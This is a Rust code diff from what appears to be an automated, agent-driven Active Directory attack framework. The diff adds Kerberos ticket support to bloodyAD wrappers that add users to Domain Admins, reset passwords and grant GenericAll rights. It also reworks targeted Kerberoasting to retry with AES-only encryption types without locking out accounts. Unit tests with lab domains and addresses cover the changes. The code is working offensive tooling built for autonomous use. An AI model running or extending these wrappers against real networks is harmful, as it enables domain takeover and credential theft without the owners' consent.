@@ -24,26 +24,53 @@ fn domain_to_base_dn(domain: &str) -> String {
 
 /// Add a user to a group via `bloodyAD add groupMember`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `group`, `target_user`
+/// Required args: `domain`, `dc_ip`, `group`, `target_user`
+/// Auth — one of:
+///   - `username` + `password` (plaintext NTLM bind)
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
+///
+/// When `ticket_path` is provided it takes precedence over username/password
+/// — the cross-forest credential resolver injects an inter-realm ccache for
+/// foreign-forest writes that NTLM bind would reject with 0x52e. Without the
+/// Kerberos branch the ccache injection is silently dropped (Bug B) and the
+/// dispatch wastes the agent's tool budget on a guaranteed-failed bind.
 pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
+    build_bloodyad_add_group_member(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let group = required_str(args, "group")?;
     let target_user = required_str(args, "target_user")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
-        .arg("add")
-        .arg("groupMember")
-        .arg(group)
-        .arg(target_user)
-        .timeout_secs(60)
-        .execute()
-        .await
+    let cmd = if let Some(tpath) = ticket_path {
+        CommandBuilder::new("bloodyAD")
+            .flag("-d", domain)
+            .flag("--host", dc_ip)
+            .arg("-k")
+            .flag("-K", tpath.to_string())
+            .arg("add")
+            .arg("groupMember")
+            .arg(group)
+            .arg(target_user)
+            .env("KRB5CCNAME", tpath)
+            .timeout_secs(60)
+    } else {
+        let username = required_str(args, "username")?;
+        let password = required_str(args, "password")?;
+        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
+        CommandBuilder::new("bloodyAD")
+            .args(creds)
+            .arg("add")
+            .arg("groupMember")
+            .arg(group)
+            .arg(target_user)
+            .timeout_secs(60)
+    };
+    Ok(cmd)
 }
 
 /// Set a user's password via `bloodyAD set password`.
@@ -57,13 +84,18 @@ pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
 /// The env var `KRB5CCNAME` is set to the path so bloodyad's Kerberos stack
 /// picks it up without a separate `kinit` step.
 pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
+    build_bloodyad_set_password(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_user = required_str(args, "target_user")?;
     let new_password = required_str(args, "new_password")?;
     let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    if let Some(tpath) = ticket_path {
+    let cmd = if let Some(tpath) = ticket_path {
         // Kerberos mode: bloodyAD -d <domain> --host <dc_ip> -k -K <ccache>
         CommandBuilder::new("bloodyAD")
             .flag("-d", domain)
@@ -78,8 +110,6 @@ pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
             // versions read it even when -K is passed.
             .env("KRB5CCNAME", tpath)
             .timeout_secs(60)
-            .execute()
-            .await
     } else {
         let username = required_str(args, "username")?;
         let password = required_str(args, "password")?;
@@ -91,33 +121,56 @@ pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
             .arg(target_user)
             .arg(new_password)
             .timeout_secs(60)
-            .execute()
-            .await
-    }
+    };
+    Ok(cmd)
 }
 
 /// Grant GenericAll rights via `bloodyAD add genericAll`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_dn`, `principal`
+/// Required args: `domain`, `dc_ip`, `target_dn`, `principal`
+/// Auth — one of:
+///   - `username` + `password` (plaintext NTLM bind)
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
+///
+/// `ticket_path` takes precedence — same Bug B rationale as
+/// `bloodyad_add_group_member`.
 pub async fn bloodyad_add_genericall(args: &Value) -> Result<ToolOutput> {
+    build_bloodyad_add_genericall(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_dn = required_str(args, "target_dn")?;
     let principal = required_str(args, "principal")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
-        .arg("add")
-        .arg("genericAll")
-        .arg(target_dn)
-        .arg(principal)
-        .timeout_secs(60)
-        .execute()
-        .await
+    let cmd = if let Some(tpath) = ticket_path {
+        CommandBuilder::new("bloodyAD")
+            .flag("-d", domain)
+            .flag("--host", dc_ip)
+            .arg("-k")
+            .flag("-K", tpath.to_string())
+            .arg("add")
+            .arg("genericAll")
+            .arg(target_dn)
+            .arg(principal)
+            .env("KRB5CCNAME", tpath)
+            .timeout_secs(60)
+    } else {
+        let username = required_str(args, "username")?;
+        let password = required_str(args, "password")?;
+        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
+        CommandBuilder::new("bloodyAD")
+            .args(creds)
+            .arg("add")
+            .arg("genericAll")
+            .arg(target_dn)
+            .arg(principal)
+            .timeout_secs(60)
+    };
+    Ok(cmd)
 }
 
 /// Add an ACL entry to the AdminSDHolder container via `bloodyAD add aclEntry`.
@@ -197,25 +250,95 @@ pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-/// Perform targeted Kerberoasting via `targetedKerberoast.py`.
+/// Perform targeted Kerberoasting.
 ///
 /// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`
+/// Optional args: `etype_hint` (array of Kerberos etype names, e.g.
+///   `["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"]`)
+///
+/// When `etype_hint` is absent we invoke `targetedKerberoast.py`, which
+/// issues the TGS-REQ with the default etype priority (RC4 first).
+///
+/// When `etype_hint` is present we switch to `impacket-GetUserSPNs
+/// -request-user <target_user> -supported-enctypes <bitmask>` because
+/// `targetedKerberoast.py` exposes no etype-selection flag. Bug E: after a
+/// `KDC_ERR_ETYPE_NOSUPP` rejection the orchestrator dispatches an AES-only
+/// retry — passing the hint to a tool that always issues RC4 would just
+/// loop until the SPN account locks out. The bitmask follows
+/// `msDS-SupportedEncryptionTypes`: AES256=0x10, AES128=0x08, RC4=0x04.
 pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
+    build_targeted_kerberoast(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
     let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_user = required_str(args, "target_user")?;
 
-    CommandBuilder::new("targetedKerberoast.py")
-        .flag("-d", domain)
-        .flag("-u", username)
-        .flag("-p", password)
-        .flag("-t", target_user)
-        .flag("-dc-ip", dc_ip)
-        .timeout_secs(120)
-        .execute()
-        .await
+    let etype_mask = etype_hint_bitmask(args);
+
+    let cmd = if let Some(mask) = etype_mask {
+        // Switch to impacket-GetUserSPNs because targetedKerberoast.py has
+        // no etype selector. `-request-user` limits the dispatch to the
+        // single SPN account so we don't trigger a forest-wide kerberoast
+        // pass that may relock other principals.
+        let target = credentials::impacket_target(Some(domain), username, Some(password), dc_ip);
+        CommandBuilder::new("impacket-GetUserSPNs")
+            .arg(target)
+            .arg("-dc-ip")
+            .arg(dc_ip)
+            .arg("-request-user")
+            .arg(target_user)
+            .arg("-supported-enctypes")
+            .arg(mask.to_string())
+            .timeout_secs(120)
+    } else {
+        CommandBuilder::new("targetedKerberoast.py")
+            .flag("-d", domain)
+            .flag("-u", username)
+            .flag("-p", password)
+            .flag("-t", target_user)
+            .flag("-dc-ip", dc_ip)
+            .timeout_secs(120)
+    };
+    Ok(cmd)
+}
+
+/// Translate an `etype_hint` array into the `msDS-SupportedEncryptionTypes`
+/// bitmask impacket-GetUserSPNs reads via `-supported-enctypes`. Returns
+/// `None` when the hint is missing or empty — callers fall back to the
+/// no-etype-selection path. Unknown etype strings are skipped with a
+/// `tracing::warn!` so a future etype name addition doesn't silently bake
+/// a zero bitmask into the dispatch.
+fn etype_hint_bitmask(args: &Value) -> Option<u32> {
+    let arr = args.get("etype_hint").and_then(|v| v.as_array())?;
+    let mut mask: u32 = 0;
+    for v in arr {
+        let Some(name) = v.as_str() else { continue };
+        let bit = match name.to_ascii_lowercase().as_str() {
+            "aes256-cts-hmac-sha1-96" | "aes256" | "aes256-cts" => 0x10,
+            "aes128-cts-hmac-sha1-96" | "aes128" | "aes128-cts" => 0x08,
+            "rc4-hmac" | "rc4_hmac" | "rc4" | "arcfour-hmac" => 0x04,
+            "des-cbc-md5" | "des_cbc_md5" => 0x02,
+            "des-cbc-crc" | "des_cbc_crc" => 0x01,
+            other => {
+                tracing::warn!(
+                    etype = %other,
+                    "targeted_kerberoast: unknown etype_hint value, ignored"
+                );
+                continue;
+            }
+        };
+        mask |= bit;
+    }
+    if mask == 0 {
+        None
+    } else {
+        Some(mask)
+    }
 }
 
 /// Abuse Group Policy Objects via `SharpGPOAbuse.exe` (run through mono on Linux).
@@ -1080,5 +1203,172 @@ mod tests {
             "target_dn": "CN=Users,DC=contoso,DC=local"
         });
         assert!(super::dacl_edit(&args).await.is_ok());
+    }
+
+    // ── Bug B: ticket_path → KRB5CCNAME env wiring ──────────────────────
+
+    #[test]
+    fn bloodyad_set_password_invocation_receives_krb5ccname_env() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "target_user": "svc_exploit",
+            "new_password": "NewP@ss!99",
+            "ticket_path": "/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache",
+        });
+        let cmd = super::build_bloodyad_set_password(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .any(|(k, v)| k == "KRB5CCNAME"
+                    && v == "/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache"),
+            "KRB5CCNAME must reach the bloodyAD subprocess when ticket_path is supplied"
+        );
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-k"), "expected -k flag");
+        assert!(args_vec.iter().any(|a| a == "-K"), "expected -K flag");
+    }
+
+    #[test]
+    fn bloodyad_add_group_member_invocation_receives_krb5ccname_env() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "group": "Domain Admins",
+            "target_user": "alice",
+            "ticket_path": "/tmp/ares-tickets/x.ccache",
+        });
+        let cmd = super::build_bloodyad_add_group_member(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/x.ccache"),
+            "ticket_path must export KRB5CCNAME for bloodyad_add_group_member"
+        );
+        assert!(
+            cmd.args_for_test().iter().any(|a| a == "-k"),
+            "expected bloodyAD -k flag for Kerberos auth"
+        );
+    }
+
+    #[test]
+    fn bloodyad_add_group_member_password_branch_unchanged() {
+        // Sanity: without ticket_path the legacy NTLM bind args are still
+        // produced. Regression guard for the conditional in
+        // build_bloodyad_add_group_member.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.1",
+            "group": "Domain Admins",
+            "target_user": "alice",
+        });
+        let cmd = super::build_bloodyad_add_group_member(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .all(|(k, _)| k != "KRB5CCNAME"),
+            "NTLM-bind branch must not export KRB5CCNAME"
+        );
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-u"));
+        assert!(args_vec.iter().any(|a| a == "-p"));
+    }
+
+    #[test]
+    fn bloodyad_add_genericall_invocation_receives_krb5ccname_env() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "target_dn": "CN=Users,DC=fabrikam,DC=local",
+            "principal": "alice",
+            "ticket_path": "/tmp/ares-tickets/y.ccache",
+        });
+        let cmd = super::build_bloodyad_add_genericall(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/y.ccache"),
+            "ticket_path must export KRB5CCNAME for bloodyad_add_genericall"
+        );
+        assert!(cmd.args_for_test().iter().any(|a| a == "-k"));
+    }
+
+    // ── Bug E: etype_hint consumption ───────────────────────────────────
+
+    #[test]
+    fn targeted_kerberoast_passes_etype_hint_to_underlying_binary() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "username": "carol",
+            "password": "fr3edom",
+            "dc_ip": "192.168.58.20",
+            "target_user": "sql_svc",
+            "etype_hint": ["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"],
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        // AES256(0x10) | AES128(0x08) = 24
+        let mask_idx = args_vec
+            .iter()
+            .position(|a| a == "-supported-enctypes")
+            .expect("etype_hint must produce -supported-enctypes flag");
+        assert_eq!(
+            args_vec.get(mask_idx + 1).map(String::as_str),
+            Some("24"),
+            "AES256+AES128 etype_hint must serialize to the msDS-SupportedEncryptionTypes \
+             bitmask value 24 (0x18) so impacket-GetUserSPNs requests AES-only TGS"
+        );
+        assert!(
+            args_vec.iter().any(|a| a == "-request-user"),
+            "expected -request-user flag to scope the kerberoast"
+        );
+    }
+
+    #[test]
+    fn targeted_kerberoast_without_etype_hint_falls_back_to_targetedkerberoast_py() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.1",
+            "target_user": "svc_sql",
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        // The legacy `-t` flag is targetedKerberoast.py's per-user selector;
+        // impacket-GetUserSPNs uses `-request-user` instead. Either presence
+        // is sufficient to confirm the fallback path is reached, but the -t
+        // flag pins the implementation choice when no etype_hint is set.
+        let args_vec = cmd.args_for_test();
+        assert!(
+            args_vec.iter().any(|a| a == "-t"),
+            "no etype_hint → must invoke targetedKerberoast.py (-t flag)"
+        );
+        assert!(
+            args_vec.iter().all(|a| a != "-supported-enctypes"),
+            "no etype_hint → must NOT pass -supported-enctypes"
+        );
+    }
+
+    #[test]
+    fn etype_hint_bitmask_handles_unknown_etypes() {
+        let args = json!({
+            "etype_hint": ["unknown-cipher", "aes256-cts-hmac-sha1-96"],
+        });
+        let mask = super::etype_hint_bitmask(&args).unwrap();
+        assert_eq!(mask, 0x10, "only the known AES256 bit should be set");
+    }
+
+    #[test]
+    fn etype_hint_bitmask_none_when_array_missing() {
+        let args = json!({"foo": "bar"});
+        assert!(super::etype_hint_bitmask(&args).is_none());
+    }
+
+    #[test]
+    fn etype_hint_bitmask_none_when_all_unknown() {
+        let args = json!({"etype_hint": ["completely-bogus"]});
+        assert!(super::etype_hint_bitmask(&args).is_none());
     }
 }
